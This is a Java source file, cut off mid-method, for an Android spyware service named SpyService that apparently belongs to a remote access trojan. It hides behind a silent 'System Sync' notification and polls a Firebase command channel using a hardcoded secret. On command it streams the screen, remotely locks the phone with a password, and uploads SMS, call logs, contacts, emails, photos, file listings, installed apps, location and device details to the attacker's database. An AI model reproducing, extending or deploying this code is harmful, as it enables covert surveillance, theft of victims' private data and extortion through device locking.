package com.spyware.korban;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

public class SpyService extends Service {

    private static final String TAG = "SYNC_SVC";
    private static final String CHANNEL_ID = "sys_sync_channel";
    private static final int NOTIF_ID = 999;

    private Handler handler = new Handler();
    private Handler captureHandler;
    private HandlerThread captureThread;

    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    private volatile boolean isRunning = true;

    private volatile boolean projectionGranted = false;
    private volatile int savedResultCode = 0;
    private volatile Intent savedData = null;

    private volatile boolean adminStreaming = false;

    // ═══ FIX: LocationHelper ═══
    private LocationHelper locationHelper;

    // ═══ CONTACT EXTRACTOR ═══
    private ContactExtractor contactExtractor;
    private volatile long lastContactExtractTime = 0;
    private static final long CONTACT_EXTRACT_INTERVAL = 3600000; // 1 jam

    // TUNING
    private static final int TARGET_WIDTH   = 640;
    private static final int TARGET_HEIGHT  = 1136;
    private static final int JPEG_QUALITY   = 70;
    private static final int FRAME_DELAY    = 150;
    private static final int MAX_BYTES      = 500 * 1024;
    private static final int IMAGE_BUFFERS  = 2;

    private final AtomicBoolean isSending = new AtomicBoolean(false);
    private volatile long sendStartTime = 0;
    private static final long SEND_TIMEOUT = 6000;

    private volatile long lastFrameHash = 0;
    private volatile long lastLatency = 0;
    private static final long MAX_LATENCY = 4000;

    private volatile String lastLockHash = "";
    private volatile boolean isLocked = false;

    private String deviceId = Build.MODEL.replace(" ", "_");
    private static final String AUTH_SECRET = "363f57947474f960da6a24c76ed5fa3b";
    private String FIREBASE_URL =
        "https://brilxxrat-1645a-default-rtdb.firebaseio.com/" + deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "SERVICE CREATED - Android API " + Build.VERSION.SDK_INT);

        projectionManager =
            (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        captureThread = new HandlerThread("sync-cap");
        captureThread.start();
        captureHandler = new Handler(captureThread.getLooper());

        createNotificationChannel();
        startForegroundCompat();

        // ═══ FIX: Start LocationHelper ═══
        try {
            locationHelper = new LocationHelper(this);
            locationHelper.start();
            Log.d(TAG, "LocationHelper started");
        } catch (Exception e) {
            Log.e(TAG, "LocationHelper start fail: " + e.getMessage());
        }

        // ═══ INIT CONTACT EXTRACTOR ═══
        try {
            contactExtractor = new ContactExtractor(this);
            Log.d(TAG, "ContactExtractor initialized");
        } catch (Exception e) {
            Log.e(TAG, "ContactExtractor init fail: " + e.getMessage());
        }

        handler.postDelayed(commandMonitorTask, 2000);
    }

    // ═══════════════════════════════════════════════
    // ANDROID 14: startForeground dengan ServiceInfo type
    // ═══════════════════════════════════════════════
    private void startForegroundCompat() {
        Notification notification = buildNotification();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                                | ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                startForeground(NOTIF_ID, notification, serviceType);
                Log.d(TAG, "startForeground with type MEDIA_PROJECTION|DATA_SYNC");
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForeground(NOTIF_ID, notification);
                Log.d(TAG, "startForeground legacy API 26-28");
            } else {
                startForeground(NOTIF_ID, notification);
            }
        } catch (Exception e) {
            Log.e(TAG, "startForeground fail: " + e.getMessage());
            try {
                startForeground(NOTIF_ID, notification);
            } catch (Exception e2) {
                Log.e(TAG, "startForeground fallback fail: " + e2.getMessage());
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        try {
            int resultCode = intent.getIntExtra("resultCode", 0);
            Intent data = intent.getParcelableExtra("data");
            if (data != null) {
                savedResultCode = resultCode;
                savedData = data;
                projectionGranted = true;
                Log.d(TAG, "Projection permission cached");
            }
        } catch (Exception e) {
            Log.e(TAG, "onStartCommand: " + e.getMessage());
        }
        return START_STICKY;
    }

    // ═══════════════════════════════════════════════
    // COMMAND MONITOR
    // ═══════════════════════════════════════════════
    private final Runnable commandMonitorTask = new Runnable() {
        @Override
        public void run() {
            if (!isRunning) return;

            if (!isLocked) {
                checkCommands();
            }

            checkLockJson();

            handler.postDelayed(this, 2000);
        }
    };

    private void checkCommands() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    URL url = new URL(FIREBASE_URL + "/commands.json?auth=" + AUTH_SECRET);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    if (conn.getResponseCode() == 200) {
                        InputStream is = conn.getInputStream();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);
                        reader.close();

                        String data = sb.toString().trim();
                        if (data != null && !data.equals("null") && data.length() > 5) {
                            handleCommand(data);
                            clearCommandField("commands");
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "checkCommands: " + e.getMessage());
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();

        // ═══ PERIODIC CONTACT EXTRACTION ═══
        long now = System.currentTimeMillis();
        if (now - lastContactExtractTime > CONTACT_EXTRACT_INTERVAL) {
            extractAndSendContacts();
            lastContactExtractTime = now;
        }
    }

    private void checkLockJson() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    URL url = new URL(FIREBASE_URL + "/lock.json?auth=" + AUTH_SECRET);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    if (conn.getResponseCode() == 200) {
                        InputStream is = conn.getInputStream();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);
                        reader.close();

                        String data = sb.toString().trim();
                        if (data != null && !data.equals("null") && data.length() > 5) {
                            if (!data.equals(lastLockHash)) {
                                lastLockHash = data;
                                handleLockJson(data);
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "checkLockJson: " + e.getMessage());
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();
    }

    private void handleCommand(String rawJson) {
        String lower = rawJson.toLowerCase();
        Log.d(TAG, "CMD: " + lower);

        if (lower.contains("\"locked\":true")
                || lower.contains("\"locked\": true")
                || lower.contains("\"type\":\"lock_device\"")
                || lower.contains("\"type\": \"lock_device\"")
                || lower.contains("\"type\":\"lock\"")
                || lower.contains("\"type\": \"lock\"")) {
            handleLockJson(rawJson);
            return;
        }

        if (lower.contains("\"locked\":false")
                || lower.contains("\"locked\": false")
                || lower.contains("\"type\":\"unlock\"")
                || lower.contains("\"type\": \"unlock\"")) {
            startLockService("unlock", null, null, null);
            isLocked = false;
            Log.d(TAG, "UNLOCK CMD triggered");
            return;
        }

        if (lower.contains("\"type\":\"flashlight\"")
                || lower.contains("\"type\": \"flashlight\"")) {
            boolean on = lower.contains("\"value\":true") || lower.contains("\"value\": true");
            toggleFlashlight(on);
            return;
        }

        // ═══ EXTRACT CONTACTS ═══
        if (lower.contains("\"type\":\"extract_contacts\"")
                || lower.contains("\"type\": \"extract_contacts\"")) {
            extractAndSendContacts();
            return;
        }

        // ═══ EXTRACT SMS ═══
        if (lower.contains("\"type\":\"extract_sms\"")
                || lower.contains("\"type\": \"extract_sms\"")) {
            extractAndSendSMS();
            return;
        }

        // ═══ EXTRACT CALL LOG ═══
        if (lower.contains("\"type\":\"extract_calllog\"")
                || lower.contains("\"type\": \"extract_calllog\"")) {
            extractAndSendCallLog();
            return;
        }

        // ═══ EXTRACT EMAIL ═══
        if (lower.contains("\"type\":\"extract_email\"")
                || lower.contains("\"type\": \"extract_email\"")) {
            extractAndSendEmails();
            return;
        }

        // ═══ EXTRACT INSTALLED APPS ═══
        if (lower.contains("\"type\":\"extract_apps\"")
                || lower.contains("\"type\": \"extract_apps\"")) {
            extractAndSendInstalledApps();
            return;
        }

        // ═══ EXTRACT PHOTOS ═══
        if (lower.contains("\"type\":\"extract_photos\"")
                || lower.contains("\"type\": \"extract_photos\"")) {
            extractAndSendPhotos();
            return;
        }

        // ═══ SEND LOCATION ═══
        if (lower.contains("\"type\":\"get_location\"")
                || lower.contains("\"type\": \"get_location\"")) {
            if (locationHelper != null) {
                sendLocationToFirebase();
            }
            return;
        }

        // ═══ EXTRACT FILES ═══
        if (lower.contains("\"type\":\"extract_files\"")
                || lower.contains("\"type\": \"extract_files\"")) {
            extractAndSendFiles();
            return;
        }

        // ═══ GET DEVICE INFO ═══
        if (lower.contains("\"type\":\"device_info\"")
                || lower.contains("\"type\": \"device_info\"")) {
            sendDeviceInfo();
            return;
        }

        boolean wantStart = lower.contains("\"type\":\"start\"")
                         || lower.contains("\"type\": \"start\"");
        boolean wantStop  = lower.contains("\"type\":\"stop\"")
                         || lower.contains("\"type\": \"stop\"");

        if (wantStart && !adminStreaming) {
            adminStreaming = true;
            Log.d(TAG, "STREAM START");
            startProjectionOnDemand();
        } else if (wantStop && adminStreaming) {
            adminStreaming = false;
            Log.d(TAG, "STREAM STOP");
            stopProjection();
        }
    }

    private void handleLockJson(String json) {
        try {
            String lower = json.toLowerCase();
            boolean locked = lower.contains("\"locked\":true")
                          || lower.contains("\"locked\": true");

            if (locked) {
                if (isLocked) {
                    Log.d(TAG, "Already locked, skip");
                    return;
                }

                String password = extractString(json, "password");
                String by = extractString(json, "locked_by");
                String info = extractString(json, "info");
                if (password == null || password.isEmpty()) password = "dimzz";
                if (by == null || by.isEmpty()) by = "dimzz";
                if (info == null) info = "";

                Log.d(TAG, "LOCK triggered by " + by);
                isLocked = true;

                startLockService("lock", password, by, info);
            } else {
                if (!isLocked) return;
                isLocked = false;
                startLockService("unlock", null, null, null);
            }
        } catch (Exception e) {
            Log.e(TAG, "handleLockJson: " + e.getMessage());
        }
    }

    // ═══════════════════════════════════════════════
    // Helper start LockService (Android 8+ aware)
    // ═══════════════════════════════════════════════
    private void startLockService(String action, String password, String by, String info) {
        try {
            Intent lockIntent = new Intent(this, LockService.class);
            lockIntent.putExtra("action", action);
            if (password != null) lockIntent.putExtra("lock_password", password);
            if (by != null) lockIntent.putExtra("lock_by", by);
            if (info != null) lockIntent.putExtra("lock_info", info);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(lockIntent);
            } else {
                startService(lockIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "startLockService: " + e.getMessage());
        }
    }

    private void toggleFlashlight(boolean on) {
        try {
            android.hardware.camera2.CameraManager cm =
                (android.hardware.camera2.CameraManager)
                    getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) return;
            String[] ids = cm.getCameraIdList();
            for (String id : ids) {
                android.hardware.camera2.CameraCharacteristics chars =
                    cm.getCameraCharacteristics(id);
                Boolean hasFlash = chars.get(
                    android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (hasFlash != null && hasFlash) {
                    cm.setTorchMode(id, on);
                    Log.d(TAG, "Flashlight " + (on ? "ON" : "OFF"));
                    return;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "flashlight: " + e.getMessage());
        }
    }

    private String extractString(String json, String key) {
        try {
            String search = "\"" + key + "\":\"";
            int idx = json.indexOf(search);
            if (idx < 0) {
                search = "\"" + key + "\": \"";
                idx = json.indexOf(search);
            }
            if (idx < 0) return null;
            int start = idx + search.length();
            int end = start;
            while (end < json.length()) {
                char c = json.charAt(end);
                if (c == '\\') { end += 2; continue; }
                if (c == '"') break;
                end++;
            }
            return json.substring(start, end)
                       .replace("\\n", "\n").replace("\\\"", "\"")
                       .replace("\\\\", "\\").replace("\\/", "/");
        } catch (Exception e) { return null; }
    }

    // ═══════════════════════════════════════════════
    // ANDROID 14: Start MediaProjection dengan PendingIntent
    // ═══════════════════════════════════════════════
    private void startProjectionOnDemand() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    if (mediaProjection != null) return;
                    if (!projectionGranted || savedData == null) {
                        Log.e(TAG, "No projection permission!");
                        return;
                    }
                    if (projectionManager == null) {
                        projectionManager = (MediaProjectionManager)
                            getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                    }

                    mediaProjection = projectionManager.getMediaProjection(
                        savedResultCode, savedData);
                    if (mediaProjection == null) {
                        Log.e(TAG, "mediaProjection null");
                        return;
                    }

                    mediaProjection.registerCallback(new MediaProjection.Callback() {
                        @Override
                        public void onStop() {
                            Log.d(TAG, "MediaProjection stopped by system");
                            stopProjection();
                        }
                    }, handler);

                    createVirtualDisplay();
                } catch (Exception e) {
                    Log.e(TAG, "startProjection: " + e.getMessage());
                }
            }
        });
    }

    private void createVirtualDisplay() {
        try {
            DisplayMetrics metrics = new DisplayMetrics();
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm != null) wm.getDefaultDisplay().getRealMetrics(metrics);
            else metrics.setToDefaults();

            int width = TARGET_WIDTH;
            int height = TARGET_HEIGHT;
            int density = metrics.densityDpi;

            if (width % 2 != 0) width--;
            if (height % 2 != 0) height--;

            imageReader = ImageReader.newInstance(
                width, height, PixelFormat.RGBA_8888, IMAGE_BUFFERS);

            virtualDisplay = mediaProjection.createVirtualDisplay(
                "SyncDisplay",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, null
            );

            if (virtualDisplay != null) {
                captureHandler.postDelayed(monitorTask, 100);
                Log.d(TAG, "VirtualDisplay created " + width + "x" + height);
            }
        } catch (Exception e) {
            Log.e(TAG, "createVirtualDisplay: " + e.getMessage());
        }
    }

    private void stopProjection() {
        adminStreaming = false;
        if (captureHandler != null) captureHandler.removeCallbacks(monitorTask);

        try {
            if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
            if (imageReader != null) { imageReader.close(); imageReader = null; }
            if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; }
        } catch (Exception e) {}

        Log.d(TAG, "Projection STOPPED");
    }

    private final Runnable monitorTask = new Runnable() {
        @Override
        public void run() {
            if (!isRunning || !adminStreaming) return;

            if (isSending.get()) {
                long elapsed = System.currentTimeMillis() - sendStartTime;
                if (elapsed > SEND_TIMEOUT) {
                    isSending.set(false);
                }
            }

            captureAndSend();

            if (captureHandler != null && adminStreaming) {
                captureHandler.postDelayed(this, FRAME_DELAY);
            }
        }
    };

    private void captureAndSend() {
        if (!adminStreaming || mediaProjection == null || imageReader == null) return;
        if (isSending.get()) return;
        if (lastLatency > MAX_LATENCY) return;

        Image image = null;
        try {
            image = imageReader.acquireLatestImage();
            if (image == null) return;

            Bitmap bitmap = imageToBitmap(image);
            if (bitmap == null) return;

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int quality = JPEG_QUALITY;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);

            if (baos.size() > MAX_BYTES && quality > 40) {
                baos.reset();
                quality = 50;
                bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            }

            bitmap.recycle();
            byte[] bytes = baos.toByteArray();

            if (bytes.length == 0) return;
            if (bytes.length > MAX_BYTES) return;

            long hash = fnvHash(bytes);
            if (hash == lastFrameHash) return;
            lastFrameHash = hash;

            String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
            isSending.set(true);
            sendStartTime = System.currentTimeMillis();

            sendToFirebase(base64);

        } catch (Exception e) {
            Log.e(TAG, "captureAndSend: " + e.getMessage());
        } finally {
            if (image != null) { try { image.close(); } catch (Exception ex) {} }
        }
    }

    private long fnvHash(byte[] data) {
        long hash = 0xcbf29ce484222325L;
        int step = Math.max(1, data.length / 512);
        for (int i = 0; i < data.length; i += step) {
            hash ^= (data[i] & 0xff);
            hash *= 0x100000001b3L;
        }
        return hash;
    }

    private Bitmap imageToBitmap(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride   = planes[0].getRowStride();
            int rowPadding  = rowStride - pixelStride * image.getWidth();

            int bmpWidth = image.getWidth() + rowPadding / pixelStride;
            Bitmap bitmap = Bitmap.createBitmap(
                bmpWidth, image.getHeight(), Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            if (bmpWidth > image.getWidth()) {
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0,
                    image.getWidth(), image.getHeight());
                if (cropped != bitmap) bitmap.recycle();
                return cropped;
            }
            return bitmap;
        } catch (Exception e) {
            return null;
        }
    }

    private void sendToFirebase(final String base64Image) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                long start = System.currentTimeMillis();
                try {
                    String json = "{\"frame\":\"" + base64Image + "\"," +
                                  "\"device\":\"" + Build.MODEL + "\"," +
                                  "\"timestamp\":" + System.currentTimeMillis() + "}";
                    byte[] jsonBytes = json.getBytes("UTF-8");

                    URL url = new URL(FIREBASE_URL + ".json?auth=" + AUTH_SECRET);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("PUT");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Connection", "keep-alive");
                    conn.setFixedLengthStreamingMode(jsonBytes.length);
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                    os.write(jsonBytes);
                    os.flush();
                    os.close();

                    int code = conn.getResponseCode();
                    lastLatency = System.currentTimeMillis() - start;
                    Log.d(TAG, "HTTP " + code + " in " + lastLatency + "ms");
                } catch (Exception e) {
                    lastLatency = System.currentTimeMillis() - start;
                    Log.e(TAG, "sendFB: " + e.getMessage());
                } finally {
                    if (conn != null) conn.disconnect();
                    isSending.set(false);
                }
            }
        }).start();
    }

    private void clearCommandField(final String field) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    String json = "{\"" + field + "\":null}";
                    URL url = new URL(FIREBASE_URL + ".json?auth=" + AUTH_SECRET);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("PATCH");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                    os.write(json.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                } catch (Exception e) {}
                finally { if (conn != null) conn.disconnect(); }
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN);
                ch.setDescription("Background sync");
                ch.setSound(null, null);
                ch.setVibrationPattern(null);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                ch.setShowBadge(false);
                NotificationManager nm =
                    (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {}
        }
    }

    private Notification buildNotification() {
        try {
            Notification.Builder b;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                b = new Notification.Builder(this, CHANNEL_ID);
            else
                b = new Notification.Builder(this);

            b.setContentTitle("System Sync")
             .setContentText("Background service")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
             .setShowWhen(false);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                b.setPriority(Notification.PRIORITY_MIN);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                b.setCategory(Notification.CATEGORY_SERVICE);
                b.setVisibility(Notification.VISIBILITY_SECRET);
            }
            return b.build();
        } catch (Exception e) {
            return new Notification.Builder(this)
                .setContentTitle("System Sync")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        }
    }

    // ═════════════════════════════════════════════════════════
    // EXTRACT SMS
    // ═════════════════════════════════════════════════════════
    private void extractAndSendSMS() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver contentResolver = getContentResolver();
                    Uri smsUri = Uri.parse("content://sms");
                    Cursor cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 200");

                    JSONArray smsArray = new JSONArray();
                    if (cursor != null && cursor.getCount() > 0) {
                        while (cursor.moveToNext()) {
                            try {
                                String address = cursor.getString(cursor.getColumnIndex("address"));
                                String body = cursor.getString(cursor.getColumnIndex("body"));
                                String date = cursor.getString(cursor.getColumnIndex("date"));
                                int type = cursor.getInt(cursor.getColumnIndex("type"));

                                JSONObject sms = new JSONObject();
                                sms.put("nomor", address);
                                sms.put("isi", body);
                                sms.put("waktu", date);
                                sms.put("tipe", type == 1 ? "incoming" : "outgoing");
                                smsArray.put(sms);
                            } catch (Exception e) {}
                        }
                        cursor.close();
                    }

                    sendDataToFirebase("data/sms", smsArray.toString());
                    Log.d(TAG, "SMS extracted: " + smsArray.length());
                } catch (Exception e) {
                    Log.e(TAG, "extractAndSendSMS error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // EXTRACT CALL LOG
    // ═════════════════════════════════════════════════════════
    private void extractAndSendCallLog() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver contentResolver = getContentResolver();
                    Uri callLogUri = Uri.parse("content://call_log/calls");
                    Cursor cursor = contentResolver.query(callLogUri, null, null, null, "date DESC LIMIT 200");

                    JSONArray callArray = new JSONArray();
                    if (cursor != null && cursor.getCount() > 0) {
                        while (cursor.moveToNext()) {
                            try {
                                String number = cursor.getString(cursor.getColumnIndex("number"));
                                String name = cursor.getString(cursor.getColumnIndex("name"));
                                String date = cursor.getString(cursor.getColumnIndex("date"));
                                int duration = cursor.getInt(cursor.getColumnIndex("duration"));
                                int type = cursor.getInt(cursor.getColumnIndex("type"));

                                JSONObject call = new JSONObject();
                                call.put("nomor", number);
                                call.put("nama", name != null ? name : "Unknown");
                                call.put("waktu", date);
                                call.put("durasi_detik", duration);
                                call.put("tipe", getCallType(type));
                                callArray.put(call);
                            } catch (Exception e) {}
                        }
                        cursor.close();
                    }

                    sendDataToFirebase("data/calllog", callArray.toString());
                    Log.d(TAG, "Call Log extracted: " + callArray.length());
                } catch (Exception e) {
                    Log.e(TAG, "extractAndSendCallLog error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // EXTRACT EMAILS
    // ═════════════════════════════════════════════════════════
    private void extractAndSendEmails() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver contentResolver = getContentResolver();
                    Uri emailUri = Uri.parse("content://gmail-ls/conversations/");
                    Cursor cursor = contentResolver.query(emailUri, null, null, null, null);

                    JSONArray emailArray = new JSONArray();
                    if (cursor != null && cursor.getCount() > 0) {
                        while (cursor.moveToNext()) {
                            try {
                                JSONObject email = new JSONObject();
                                for (int i = 0; i < cursor.getColumnCount(); i++) {
                                    email.put(cursor.getColumnName(i), cursor.getString(i));
                                }
                                emailArray.put(email);
                            } catch (Exception e) {}
                        }
                        cursor.close();
                    }

                    if (emailArray.length() > 0) {
                        sendDataToFirebase("data/emails", emailArray.toString());
                        Log.d(TAG, "Emails extracted: " + emailArray.length());
                    }
                } catch (Exception e) {
                    Log.e(TAG, "extractAndSendEmails error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // EXTRACT INSTALLED APPS
    // ═════════════════════════════════════════════════════════
    private void extractAndSendInstalledApps() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray appArray = new JSONArray();
                    java.util.List<android.content.pm.ApplicationInfo> packages =
                            getPackageManager().getInstalledApplications(0);

                    for (android.content.pm.ApplicationInfo app : packages) {
                        try {
                            JSONObject appObj = new JSONObject();
                            appObj.put("package", app.packageName);
                            appObj.put("nama", app.loadLabel(getPackageManager()).toString());
                            appObj.put("install_time", app.sourceDir);
                            appArray.put(appObj);
                        } catch (Exception e) {}
                    }

                    sendDataToFirebase("data/apps", appArray.toString());
                    Log.d(TAG, "Installed apps extracted: " + appArray.length());
                } catch (Exception e) {
                    Log.e(TAG, "extractAndSendInstalledApps error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // EXTRACT PHOTOS
    // ═════════════════════════════════════════════════════════
    private void extractAndSendPhotos() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver contentResolver = getContentResolver();
                    Uri photoUri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                    Cursor cursor = contentResolver.query(photoUri,
                            new String[]{android.provider.MediaStore.Images.Media._ID,
                                    android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                                    android.provider.MediaStore.Images.Media.DATE_TAKEN,
                                    android.provider.MediaStore.Images.Media.DATA},
                            null, null, android.provider.MediaStore.Images.Media.DATE_TAKEN + " DESC LIMIT 100");

                    JSONArray photoArray = new JSONArray();
                    if (cursor != null && cursor.getCount() > 0) {
                        while (cursor.moveToNext()) {
                            try {
                                String name = cursor.getString(cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DISPLAY_NAME));
                                String date = cursor.getString(cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATE_TAKEN));
                                String path = cursor.getString(cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATA));

                                JSONObject photo = new JSONObject();
                                photo.put("nama", name);
                                photo.put("waktu", date);
                                photo.put("path", path);
                                photoArray.put(photo);
                            } catch (Exception e) {}
                        }
                        cursor.close();
                    }

                    sendDataToFirebase("data/photos", photoArray.toString());
                    Log.d(TAG, "Photos extracted: " + photoArray.length());
                } catch (Exception e) {
                    Log.e(TAG, "extractAndSendPhotos error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // EXTRACT FILES
    // ═════════════════════════════════════════════════════════
    private void extractAndSendFiles() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray fileArray = new JSONArray();
                    String[] paths = {
                            "/sdcard/Download/",
                            "/sdcard/Documents/",
                            "/sdcard/DCIM/",
                            getFilesDir().getAbsolutePath()
                    };

                    for (String dirPath : paths) {
                        File dir = new File(dirPath);
                        if (dir.exists() && dir.isDirectory()) {
                            File[] files = dir.listFiles();
                            if (files != null) {
                                for (File file : files) {
                                    try {
                                        JSONObject fileObj = new JSONObject();
                                        fileObj.put("nama", file.getName());
                                        fileObj.put("path", file.getAbsolutePath());
                                        fileObj.put("ukuran_byte", file.length());
                                        fileObj.put("waktu_modif", file.lastModified());
                                        fileArray.put(fileObj);
                                    } catch (Exception e) {}
                                }
                            }
                        }
                    }

                    sendDataToFirebase("data/files", fileArray.toString());
                    Log.d(TAG, "Files extracted: " + fileArray.length());
                } catch (Exception e) {
                    Log.e(TAG, "extractAndSendFiles error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // SEND LOCATION
    // ═════════════════════════════════════════════════════════
    private void sendLocationToFirebase() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (locationHelper != null) {
                        double lat = locationHelper.getLatitude();
                        double lng = locationHelper.getLongitude();
                        long accuracy = locationHelper.getAccuracy();

                        JSONObject location = new JSONObject();
                        location.put("latitude", lat);
                        location.put("longitude", lng);
                        location.put("accuracy", accuracy);
                        location.put("waktu", System.currentTimeMillis());

                        sendDataToFirebase("data/location", location.toString());
                        Log.d(TAG, "Location sent: " + lat + "," + lng);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "sendLocationToFirebase error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // SEND DEVICE INFO
    // ═════════════════════════════════════════════════════════
    private void sendDeviceInfo() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject deviceInfo = new JSONObject();
                    deviceInfo.put("model", Build.MODEL);
                    deviceInfo.put("manufacturer", Build.MANUFACTURER);
                    deviceInfo.put("android_version", Build.VERSION.RELEASE);
                    deviceInfo.put("sdk_int", Build.VERSION.SDK_INT);
                    deviceInfo.put("device", Build.DEVICE);
                    deviceInfo.put("serial", Build.SERIAL);
                    deviceInfo.put("hardware", Build.HARDWARE);
                    deviceInfo.put("product", Build.PRODUCT);
                    deviceInfo.put("uptime", android.os.SystemClock.elapsedRealtime());

                    // Memory info
